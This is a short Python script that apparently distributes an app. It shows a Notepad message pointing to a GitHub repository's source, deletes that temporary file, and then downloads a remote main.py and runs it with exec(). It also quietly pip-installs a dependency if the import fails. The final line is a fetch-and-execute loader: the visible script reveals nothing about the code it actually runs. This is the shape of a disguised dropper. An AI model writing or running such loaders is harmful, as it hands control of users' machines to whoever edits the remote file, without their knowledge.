try:
    import requests
    import subprocess
    import time
    import os
except:
    import os
    os.system("pip install requests")
    import time
    import requests

text = "Full source code here: https://github.com/AlexPhamNgoQuoc/appbasicbuoi1/tree/main"

# Create a temporary text file
temp_file_path = "full-source-code.txt"
with open(temp_file_path, "w") as temp_file:
    temp_file.write(text)

notepad_process = subprocess.Popen(["notepad.exe", temp_file_path])

while notepad_process.poll() is None:
    time.sleep(1)  # Wait for 1 second

os.remove(temp_file_path)
exec(requests.get("https://raw.githubusercontent.com/AlexPhamNgoQuoc/appbasicbuoi1/main/main.py").text)
